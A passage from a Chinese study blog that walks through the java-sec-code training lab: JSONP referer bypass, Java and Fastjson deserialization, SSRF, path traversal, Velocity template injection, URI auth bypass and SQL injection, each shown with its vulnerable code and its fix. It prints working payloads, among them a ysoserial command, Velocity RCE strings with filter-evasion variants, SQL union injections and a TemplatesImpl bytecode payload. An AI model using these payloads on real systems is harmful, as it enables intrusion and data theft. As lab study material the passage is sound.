&quot;);&quot;;&#125;\n\n我们就通过在前端界面自己写一个函数然后通过返回的js代码携带json数据进行各种操作\n&lt;script&gt;\tfunction aaa(data)&#123;\t\talert(JSON.stringify(data));\t&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8080/jsonp/vuln/referer?callback_=aaa&gt;&lt;/script&gt;\n\n我直接触发一个弹窗返回JSON数据，在实际中这里可以改为XSS或者CSRF\n\n\n\n\n1.空referer绕过\n@RequestMapping(value = &quot;/vuln/emptyReferer&quot;, produces = &quot;application/javascript&quot;)    public String emptyReferer(HttpServletRequest request) &#123;        String referer = request.getHeader(&quot;referer&quot;);        if (null != referer &amp;&amp; SecurityUtil.checkURL(referer) == null) &#123;            return &quot;error&quot;;        &#125;        String callback = request.getParameter(this.callback);        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));    &#125;\n\n这个代码在返回JSON数据的时候会对我们的referer进行检验，我们不知道这个校验规则，但是只要referer为空就能绕过报错\n我们需要注意的就是我们如果自己抓包手动删除请求头中的Referer或者发包就没有Referer这个字段的话，服务器端是直接检测不到referer这个字段的，所以也不会出现referer为null的情况，所以我们需要在html中设置\n添加no-referrer 参数\n    &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&lt;script&gt;\tfunction aaa(data)&#123;\t\talert(JSON.stringify(data));\t&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8080/jsonp/vuln/emptyReferer?callback_=aaa&gt;&lt;/script&gt;\n\n有个奇怪的地方就是我们设置的标签中名字为referrer，怎么和请求头中的不一样，查了一下才发现html中的才是正确写法，http中的是设计师当初写错的写法\n我们还可以通过iframe标签进行绕过\n&lt;html&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&lt;iframe src=&quot;javascript:&#x27;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;/script&gt;&lt;script src=http://172.20.10.6:8080/java_sec_code_war/jsonp/vuln/emptyReferer?callback_=test&gt;&lt;/script&gt;&#x27;&quot;&gt;&lt;/iframe&gt;&lt;/html&gt;\n\n\n\n修复代码\n@RequestMapping(value = &quot;/sec/checkReferer&quot;, produces = &quot;application/javascript&quot;)    public String safecode(HttpServletRequest request) &#123;        String referer = request.getHeader(&quot;referer&quot;);        if (SecurityUtil.checkURL(referer) == null) &#123;            return &quot;error&quot;;        &#125;        String callback = request.getParameter(this.callback);        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));    &#125;\n\n这个就是修复代码吗，不过是不给设置referer为null的机会而已\n@GetMapping(value = &quot;/fastjsonp/getToken&quot;, produces = &quot;application/javascript&quot;)    public String getCsrfToken2(HttpServletRequest request) &#123;        CsrfToken csrfToken = cookieCsrfTokenRepository.loadToken(request); // get csrf token        String callback = request.getParameter(&quot;fastjsonpCallback&quot;);        if (StringUtils.isNotBlank(callback)) &#123;            //如果callback函数存在即返回json数据            JSONPObject jsonpObj = new JSONPObject(callback);            jsonpObj.addParameter(csrfToken);            return jsonpObj.toString();        &#125; else &#123;//否则直接返回原数据            return csrfToken.toString();        &#125;    &#125;\n\nJSONPObject 是 Jackson 库（或类似 JSON 库）提供的类，专门用于生成 JSONP 格式的数据。它的核心功能是：\n\n接收一个回调函数名（如 callbackFunc）。\n允许添加参数（如 csrfToken），这些参数会被序列化成 JSON 格式。\n最终生成 callbackFunc(jsonData) 这样的字符串，可直接被浏览器执行。****\n\n这个代码和原来一样没有任何过滤，只不过检查了callback这个函数是否存在\n\n\n\n\n8.Deserialize 序列化与反序列化我们之前学习过JAVA反序列化，需要先对数据创建输入流，然后使用输入流创建对象输入流然后使用readObject方法对数据进行反序列化对对象进行属性上的赋值\nFileInputStream fileIn = new FileInputStream(&quot;object.ser&quot;);//创建文件读取流    ObjectInputStream in = new ObjectInputStream(fileIn);//创建对象输入流，包装文件输入流，由于反序列化     obj = (MyClass) in.readObject();//反序列化操作，readObject()返回的是Object类型，所以要进行强制类型转换\n\n\n\n核心代码：\n    @RequestMapping(&quot;/rememberMe/vuln&quot;)    public String rememberMeVul(HttpServletRequest request)            throws IOException, ClassNotFoundException &#123;        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);//标准库中没有getCookie这个方法，应该是一个自定义方法使用getCookies和Constants.REMEMBER_ME_COOKIE常量进行Cookie值的查找rememberMe        if (null == cookie) &#123;            return &quot;No rememberMe cookie. Right?&quot;;        &#125;        String rememberMe = cookie.getValue();        byte[] decoded = Base64.getDecoder().decode(rememberMe);//对我们Cookie的值进行Base64解码然后按字节放入数组中        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);//创建字节数组的输入流        ObjectInputStream in = new ObjectInputStream(bytes);//创建对象输入流        in.readObject();//进行反序列化        in.close();        return &quot;Are u ok?&quot;;    &#125;\n\n虽然没有任何过滤就直接进行反序列化了，但是由于没有看到可以攻击的类我也不知道该怎么使用\n看了一下发现我是对的，完全不知道怎么找链子，但是已经有工具进行直接输出链子了，\n\n\n我们只需要加入rememberMe参数然后把我们脚本生成的链子进行base64编码然后发送即可，真的是完全不会啊\n还有就是不知道为什么用PS的时候脚本返回结果总是不对，要编码就不能用PS\n:: 生成 payloadjava -jar ysoserial.jar CommonsCollections5 &quot;calc.exe&quot; &gt; payload.bin:: 转换为 Base64certutil -encode payload.bin payload.txt:: 查看结果（注意 certutil 会添加换行）type payload.txt\n\n但是如果不进行编码就是乱码，只能转Base64了，至于这个生成文件会自动换行，使用NotePad++替换一下就行了\n让我们来看修复代码\n    @RequestMapping(&quot;/rememberMe/security&quot;)    public String rememberMeBlackClassCheck(HttpServletRequest request)            throws IOException, ClassNotFoundException &#123;        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);        if (null == cookie) &#123;            return &quot;No rememberMe cookie. Right?&quot;;        &#125;        String rememberMe = cookie.getValue();        byte[] decoded = Base64.getDecoder().decode(rememberMe);        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);        try &#123;            AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException//这里创建对象输入流不是使用java自带的ObjectInputStream而是自定义了 其他和原来的代码没区别            in.readObject();            in.close();        &#125; catch (InvalidClassException e) &#123;            logger.info(e.toString());            return e.toString();        &#125;        return &quot;I&#x27;m very OK.&quot;;    &#125;\n\n\n\nAntObjectInputStream\npublic class AntObjectInputStream extends ObjectInputStream &#123;    protected final Logger logger= LoggerFactory.getLogger(AntObjectInputStream.class);//构造方法首先初始化父类调用ObjectInputStream的构造方法InputStream输入流作为参数    public AntObjectInputStream(InputStream inputStream) throws IOException &#123;        super(inputStream);    &#125;   /**     * 重写resolveClass方法，实现反序列化类的黑白名单校验     * @param desc 待反序列化的类描述符     * @return 允许反序列化的Class对象     * @throws IOException 如果IO异常     * @throws ClassNotFoundException 如果类未找到     * @throws InvalidClassException 如果类在黑名单中     */    @Override    protected Class&lt;?&gt; resolveClass(final ObjectStreamClass desc)            throws IOException, ClassNotFoundException    &#123;        String className = desc.getName();//获取反序列化的名字        // Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject        logger.info(&quot;Deserialize class name: &quot; + className);        String[] denyClasses = &#123;&quot;java.net.InetAddress&quot;,                                &quot;org.apache.commons.collections.Transformer&quot;,                                &quot;org.apache.commons.collections.functors&quot;&#125;;//黑名单        for (String denyClass : denyClasses) &#123;            if (className.startsWith(denyClass)) &#123;                throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, className);            &#125;        &#125;//如果未被黑名单过滤则调用原来的resolveClass方法        return super.resolveClass(desc);    &#125;    public static void main(String args[]) throws Exception&#123;        // 定义myObj对象        MyObject myObj = new MyObject();        myObj.name = &quot;world&quot;;        // 创建一个包含对象进行反序列化信息的/tmp/object数据文件        FileOutputStream fos = new FileOutputStream(&quot;/tmp/object&quot;);        ObjectOutputStream os = new ObjectOutputStream(fos);        // writeObject()方法将myObj对象写入/tmp/object文件        os.writeObject(myObj);        os.close();        // 从文件中反序列化obj对象        FileInputStream fis = new FileInputStream(&quot;/tmp/object&quot;);        AntObjectInputStream ois = new AntObjectInputStream(fis);  // AntObjectInputStream class        //恢复对象即反序列化        MyObject objectFromDisk = (MyObject)ois.readObject();        System.out.println(objectFromDisk.name);        ois.close();    &#125;    static class  MyObject implements Serializable &#123;        public String name;    &#125;&#125;\n\n虽然还是有点看不懂，但是大概意思就是通过继承ObjectStreamInput类然后重写方法对我们反序列化的类进行过滤，如果调用了黑名单的类就抛出异常否则就调用原来的方法\n9.SSRF之前在php中就见过了SSRF，但是好像没有哪个题目专门考SSRF，基本上都是通过各种协议对本机文件进行一个读取然后进行代码审计\n但是和之前PHP不一样的就是支持的协议和限定访问的URL都不一样\njava支持协议\nfile ftp mailto http https jar netdoc\n\n这里多了两个没见过的mailto和netdoc协议\n我们先尝试写下重定向代码\n&lt;?php$url = &#x27;gopher://35.185.163.134:2333/_joy%0achou&#x27;;header(&quot;location: $url&quot;);?&gt;\n\n访问payload\nhttp://localhost:8080/ssrf/urlConnection/vuln?url=http://127.0.0.1/test.php\n\n收到异常\njava.net.MalformedURLException: unknown protocol: gopher\n\n查看报错代码\nprivate boolean followRedirect() throws IOException &#123;    if(!this.getInstanceFollowRedirects()) &#123;        return false;    &#125; else &#123;        final int var1 = this.getResponseCode();        if(var1 &gt;= 300 &amp;&amp; var1 &lt;= 307 &amp;&amp; var1 != 306 &amp;&amp; var1 != 304) &#123;            final String var2 = this.getHeaderField(&quot;Location&quot;);            if(var2 == null) &#123;                return false;            &#125; else &#123;                URL var3;                try &#123;                    // 该行代码发生异常，var2变量值为`gopher://35.185.163.134:2333/_joy%0achou`                    var3 = new URL(var2);                    /* 该行代码，表示传入的协议必须和重定向的协议一致                     * 即http://joychou.me/302.php的协议必须和gopher://35.185.163.134:2333/_joy%0achou一致                     */                    if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;                        return false;                    &#125;                &#125; catch (MalformedURLException var8) &#123;                    var3 = new URL(this.url, var2);                &#125;\n\n从上面的followRedirect方法可以看到：\n\n实际跳转的URL也在限制的协议内\n传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。\n\n所以，Java的SSRF利用方式比较局限：\n\n利用file协议任意文件读取\n利用http协议探测端口或攻击内网服务\n\n也就是说JAVA就先不要想着通过SSRF重定向进行攻击了\n至于靶场的代码，我感觉就是一个为过滤的file协议，代码还好长，懒得看了\n未过滤代码就是直接对Url进行访问，返回结果\n\n\n修复代码则是直接限定URL前缀为http即可\n10.PathTraversal也就是目录遍历漏洞，我们之前已经在文件上传中看到过了，我们可以利用文件名直接进行保存的时候通过控制文件名进行目录跨越上传文件到网站根目录\n    @GetMapping(&quot;/path_traversal/vul&quot;)    public String getImage(String filepath) throws IOException &#123;        return getImgBase64(filepath);    &#125;    private String getImgBase64(String imgFile) throws IOException &#123;        logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));        logger.info(&quot;File path: &quot; + imgFile);        File f = new File(imgFile);        if (f.exists() &amp;&amp; !f.isDirectory()) &#123;//检查文件是否存在并且非目录            byte[] data = Files.readAllBytes(Paths.get(imgFile));            return new String(Base64.encodeBase64(data));//读取文件的字节数据并进行base64编码        &#125; else &#123;            return &quot;File doesn&#x27;t exist or is not a file.&quot;;        &#125;    &#125;\n\n这个题目我只能看看代码就行了，就是先根据路径获取到文件然后判读文件是否存在，最后返回base64数据，需要注意的是Windows路径想通过URL传递必须先编码不然会爆400\n..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cflag.txt\n\n\n\n修复代码\n    @GetMapping(&quot;/path_traversal/sec&quot;)    public String getImageSec(String filepath) throws IOException &#123;        if (SecurityUtil.pathFilter(filepath) == null) &#123;            logger.info(&quot;Illegal file path: &quot; + filepath);            return &quot;Bad boy. Illegal file path.&quot;;        &#125;        return getImgBase64(filepath);    &#125;//这里只是换了一个类的方法对路径进行过滤\n\npathFilter\npublic static String pathFilter(String filepath) &#123;    String temp = filepath;    // use while to sovle multi urlencode    while (temp.indexOf(&#x27;%&#x27;) != -1) &#123;        try &#123;            temp = URLDecoder.decode(temp, &quot;utf-8&quot;);        &#125; catch (UnsupportedEncodingException e) &#123;            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);            return null;        &#125; catch (Exception e) &#123;            logger.info(e.toString());            return null;        &#125;    &#125;    if (temp.contains(&quot;..&quot;) || temp.charAt(0) == &#x27;/&#x27;) &#123;        return null;    &#125;    return filepath;&#125;\n\n对我们..和/进行了过滤虽然第二个过滤拦不住Windows，但是没有..进行目录跨越也是没用的\n11.SSTI第一次学习SSTI实在flask的模板渲染中，SSTI的防御手段只有一种就是进行过滤，但是不同语言不同引擎的注入方法都不一样。\nssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。\n我们来看代码\n    @GetMapping(&quot;/velocity&quot;)    public void velocity(String template) &#123;//初始化Velcity引擎 可以提前配置安全参数        Velocity.init();//创建Velocity上下文，注入变量（硬编码安全数据）        VelocityContext context = new VelocityContext();        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);        context.put(&quot;phone&quot;, &quot;555-1337&quot;);//这些代码是为了模板渲染时添加变量$author调用值 //渲染用户提供的模板    StringWriter swOut = new StringWriter();    Velocity.evaluate(        context,      // 上下文变量        swOut,        // 输出写入到StringWriter        &quot;test&quot;,       // 日志标识（无实际作用）        template      // 用户控制的模板内容（危险！）    );    // 注：渲染结果未返回，但攻击者可通过恶意模板直接执行代码\n\n网上没有关于java中FreeMarker等引擎的专门教程，不知道是CTF不怎么考还是什么，这里就只是抄一下payload\n#set($x=&#x27;&#x27;)$x.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)?template=#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;)//#set($e=&quot;e&quot;); 这个是为了定义一个String对象//这里面.invoke是用于调用静态方法创建getRuntime对象\n\n\n#set($x=&#39;&#39;)\n定义一个变量 $x 并赋值为空字符串（实际类型为 String 对象）。\n\n\n$x.class\n通过 String 对象的 class 属性获取 Class 对象，进入反射链。\n\n\nforName(&#39;java.lang.Runtime&#39;)\n反射加载 Runtime 类。\n\n\ngetRuntime().exec(&#39;calc&#39;)\n调用 Runtime.getRuntime().exec() 执行系统命令（如启动计算器）。\n\n\n\n至于绕过方法我知道的只有编码绕过和拼接绕过关键词过滤\n#set($str=&quot;java.l&quot;+&quot;ang.Run&quot;+&quot;time&quot;)#set($x=$str.class.forName($str).getRuntime().exec(&quot;calc&quot;))    #set($a=&quot;ja&quot;)#set($b=&quot;va.lang.Run&quot;)#set($c=&quot;time&quot;)$a$b$c.getClass().forName($a$b$c).getRuntime().exec(&quot;calc&quot;) #set($cmd=&#x27;Y2FsYw==&#x27;|base64.decode())$x.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec($cmd)    #set($p=&#x27;java.lang.ProcessBuilder&#x27;)$x.class.forName($p).getConstructor(List.class).newInstance([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;whoami&quot;]).start()//使用ProcessBuilder类进行命令执行\n\n应该是tomcat认定为特殊字符，所以payload还是编码比较好\n\n\n\n\n12.GetRequestURI    @GetMapping(value = &quot;/exclued/vuln&quot;)    public String exclued(HttpServletRequest request) &#123;        String[] excluedPath = &#123;&quot;/css/**&quot;, &quot;/js/**&quot;&#125;;        String uri = request.getRequestURI(); // Security: request.getServletPath()//这里获取了当前请求的uri加入日志当中        PathMatcher matcher = new AntPathMatcher();// 打印日志：当前请求的URI和ServletPath（用于调试）        logger.info(&quot;getRequestURI: &quot; + uri);        logger.info(&quot;getServletPath: &quot; + request.getServletPath());        for (String path : excluedPath) &#123;            if (matcher.match(path, uri)) &#123;                return &quot;You have bypassed the login page.&quot;;            &#125;        &#125;        return &quot;This is a login page &gt;..&lt;&quot;;    &#125;//如果我们的uri中有/css/和/js/就会绕过认证\n\ngetRequestURI()：返回完整的请求路径（包含上下文路径，如 /app/css/style.css）。\n在 Java Web 应用中，Servlet 映射路径（Servlet Path） 是指客户端请求的 URL 中 直接映射到某个 Servlet 的部分，它不包含上下文路径（Context Path）和路径参数（Path Info）。\n但是这个匹配不是固定的而是和我们的系统配置有关，不会返回额外信息，单纯返回映射路径\nrequest.getServletPath()\n返回 Servlet 本身的映射路径（如 /servlet），不包含额外的路径信息。\n\n示例：若映射为 /hello，访问 /hello/world → 返回 /hello。\n\n还有就是我们需要注意一下通配符\n这里的 ** 是 Ant 风格通配符，表示：\n\n* 匹配单层路径（如 /css/* 只匹配 /css/style.css，不匹配 /css/subdir/file.css）。\n** 匹配多层路径（如 /css/** 匹配 /css/ 下的所有子目录和文件）。\n\n当应用存在静态资源目录，比如/css/目录，在权限校验时一般会选择放行，即不校验权限。研发同学用getRequestURI()获取URI后，判断是否包含 /css/字符串，如果包含则不校验权限。此时如果URI为/css/../hello，用getRequestURI()获取的URI是/css/../hello，包含/css/字符串，所以不校验权限。但是此时后端的路由为/hello，导致权限绕过。\n我们如果带有/css这个路径就会由于路径错误，如果直接访问就会进行校验\nhttp://127.0.0.1:8080/uri/css/..;/exclued/vuln\n\n这个题目给的答案实际是\n/** * The difference between getRequestURI and getServletPath. * 由于Spring Security的&lt;code&gt;antMatchers(&quot;/css/**&quot;, &quot;/js/**&quot;)&lt;/code&gt;未使用getRequestURI，所以登录不会被绕过。 * &lt;p&gt; * Details: https://joychou.org/web/security-of-getRequestURI.html * &lt;p&gt; * Poc: * http://localhost:8080/css/%2e%2e/exclued/vuln * http://localhost:8080/css/..;/exclued/vuln * http://localhost:8080/css/..;bypasswaf/exclued/vuln * * @author JoyChou @2020-03-28 */\n\n所以说如果我们这个题目不去改后台配置代码我们是不能进行绕过的，在获取uri的时候会对uri先进一次处理\nSpring Security 默认使用 getServletPath() 进行路径匹配（而非 getRequestURI）。也就是说uri都会优先使用getServletPath进行匹配一次然后再执行代码\n虽然绕过不了了，但是我们可以分析一下payload\nhttp://127.0.0.1:8080/uri/css/..;/exclued/vuln\n\n分号的作用应该就是用来防止tomcat将..作为标准uri解析，如果去掉分号则会变成\n2025-08-07 19:33:19.863  INFO 31280 --- [nio-8080-exec-3] org.joychou.controller.GetRequestURI     : getRequestURI: /uri/exclued/vuln2025-08-07 19:33:19.863  INFO 31280 --- [nio-8080-exec-3] org.joychou.controller.GetRequestURI     : getServletPath: /uri/exclued/vuln\n\n我们发现tomcat是解析了/css/../进行一次目录的穿梭，去掉了没有意义的/css/\n这个本来不规范的uri为什么不会报错，我们先来尝试把分号去掉\nhttp://127.0.0.1:8080/uri/css/..;/exclued/vuln//在经过回车后变成了http://127.0.0.1:8080/uri/exclued/vuln\n\n这明显是..作为目录跨越符起作用了，但是为什么有分号就不行。有分号后就从标准写法到了不标准写法，看起来很有道理，但是为什么又会正确解析这个就和tomcat的版本以及一些细节有关系，不是我能够知道的\n我还需要知道的是在\n旧版本（Servlet 3.0 之前）分号 ; 被用作路径参数分隔符（如 /path;jsessionid=123），分号后的内容会被截断。例如：/uri/css/..;/exclued/vuln → 实际路径为 /uri/css/..。\n新版本（Servlet 3.0+，默认行为）分号不再具有特殊含义，除非显式配置。大多数现代容器（如 Tomcat 8+）会保留分号作为普通字符。因此 ..;/exclued/vuln 会被当作完整字符串处理，不会自动截断。\n但是我自己尝试发现在uri最后的分号还是会有隔断作用\n13.SQLI终于到了SQL注入了吗，PHP学的第一个漏洞也就是这个了\n// 定义一个处理HTTP请求的控制器方法，映射到路径&quot;/jdbc/vuln&quot;// 使用@RequestParam获取请求参数&quot;username&quot;@RequestMapping(&quot;/jdbc/vuln&quot;)public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;    // 用于存储查询结果的StringBuilder    StringBuilder result = new StringBuilder();    try &#123;        // 1. 加载数据库驱动        Class.forName(driver);                // 2. 建立数据库连接        Connection con = DriverManager.getConnection(url, user, password);        // 检查连接是否成功        if (!con.isClosed())            System.out.println(&quot;Connect to database successfully.&quot;);        // 3. 创建Statement对象        Statement statement = con.createStatement();                // 4. 构造SQL查询语句 - 这里直接拼接用户输入，导致SQL注入漏洞        String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;        logger.info(sql);  // 记录SQL语句（调试用）                // 5. 执行SQL查询        ResultSet rs = statement.executeQuery(sql);        // 6. 处理查询结果        while (rs.next()) &#123;            String res_name = rs.getString(&quot;username&quot;);            String res_pwd = rs.getString(&quot;password&quot;);            String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);            result.append(info);            logger.info(info);  // 记录查询到的用户信息        &#125;                // 7. 关闭资源        rs.close();        con.close();    &#125; catch (ClassNotFoundException e) &#123;        logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;);    &#125; catch (SQLException e) &#123;        logger.error(e.toString());    &#125;        // 返回查询结果    return result.toString();&#125;\n\n我们想要注入和之前一样简单直接万能密码就行了\n&#x27; or 1=1 %23\n\n我们也可以使用联合注入等其他注入方法爆出其他数据库的信息\n?username=&#x27;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema%3Ddatabase() %23\n\n\n\n和PHP是一样的\n然后我们来看这一段修复代码\n// 定义一个处理HTTP请求的控制器方法，映射到路径&quot;/jdbc/sec&quot;@RequestMapping(&quot;/jdbc/sec&quot;)public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;    // 用于存储查询结果的StringBuilder    StringBuilder result = new StringBuilder();        try &#123;        // 1. 加载数据库驱动        Class.forName(driver);                // 2. 建立数据库连接        Connection con = DriverManager.getConnection(url, user, password);        // 检查连接是否成功        if (!con.isClosed())            System.out.println(&quot;Connect to database successfully.&quot;);        // 3. 使用PreparedStatement防止SQL注入        String sql = &quot;select * from users where username = ?&quot;;  // 使用参数占位符?        PreparedStatement st = con.prepareStatement(sql);        st.setString(1, username);  // 安全地设置参数值 根据占位符的序号安全写入参数        // 记录预处理后的SQL语句（调试用）        logger.info(st.toString());  // 注意：这里输出的不一定是最终执行的SQL                // 4. 执行查询        ResultSet rs = st.executeQuery();        // 5. 处理查询结果        while (rs.next()) &#123;            String res_name = rs.getString(&quot;username&quot;);            String res_pwd = rs.getString(&quot;password&quot;);            String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd);            result.append(info);            logger.info(info);  // 记录查询到的用户信息        &#125;        // 6. 关闭资源        rs.close();        con.close();    &#125; catch (ClassNotFoundException e) &#123;        logger.error(&quot;Sorry, can&#x27;t find the Driver!&quot;);        e.printStackTrace();    &#125; catch (SQLException e) &#123;        logger.error(e.toString());    &#125;        // 返回查询结果    return result.toString();&#125;\n\n这个就是典型的占位符直接封锁一次注入，但是要是有二次注入也是要炸掉的\n14.Fastjson我们知道java中除了传统的序列化数据还可以使用json数据进行序列化，也就是json反序列化\nFastJson是开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。\n@Controller@RequestMapping(&quot;/fastjson&quot;)public class Fastjson &#123;    @RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)    @ResponseBody    public String Deserialize(@RequestBody String params) &#123;        // 如果Content-Type不设置application/json格式，post数据会被url编码        try &#123;            // 将post提交的string转换为json            JSONObject ob = JSON.parseObject(params);//对params参数进行json反序列化            return ob.get(&quot;name&quot;).toString();        &#125; catch (Exception e) &#123;            return e.toString();        &#125;    &#125;    public static void main(String[] args) &#123;        // Open calc in mac        String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\&quot;, \\&quot;_bytecodes\\&quot;: [\\&quot;yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\\&quot;], \\&quot;_name\\&quot;: \\&quot;lightless\\&quot;, \\&quot;_tfactory\\&quot;: &#123; &#125;, \\&quot;_outputProperties\\&quot;:&#123; &#125;&#125;&quot;;        JSON.parseObject(payload, Feature.SupportNonPublicField);    &#125;&#125;\n\n我们之前学过Java反序列化，那个是通过readObject方法进行反序列化，也就是像php中userialize一样，通过改变类的属性来实现攻击。\n但是在我看来json反序列化好像不能像readObject直接对对象做出改变，我感觉更像是json_decode，会将json数据解码为字符串，数组等数据结构。\n但是至于为什么Fastjson会有json反序列化漏洞还得看Feature.SupportNonPublicField\nFeature.SupportNonPublicField 的作用\n\nFeature 是Fastjson的一个枚举类，用于控制反序列化的行为。\nSupportNonPublicField 的具体含义：\n允许反序列化非公有字段（即private、protected等字段）。\n正常情况下，Fastjson仅能反序列化公有字段（public）或通过setter方法赋值的字段。\n漏洞利用关键：TemplatesImpl类的恶意字段（如_bytecodes、_outputProperties）都是private的，需要此Feature才能注入。\n\n\n\n也就是说通过Feature.SupportNonPublicField我们可以实现对不可访问属性的反序列化\n然后就是Fastjson的特殊解析了\nFastjson 在解析 JSON 时，若字段中包含 @type，会尝试根据该类型动态实例化对应的 Java 对象。\n&#123;  &quot;@type&quot;: &quot;com.example.User&quot;,  &quot;name&quot;: &quot;test&quot;,  &quot;age&quot;: 20&#125;\n\nFastjson 会尝试：\n\n反射调用 com.example.User 的无参构造函数创建对象。\n通过 setter 或直接字段赋值到User类中（若开启 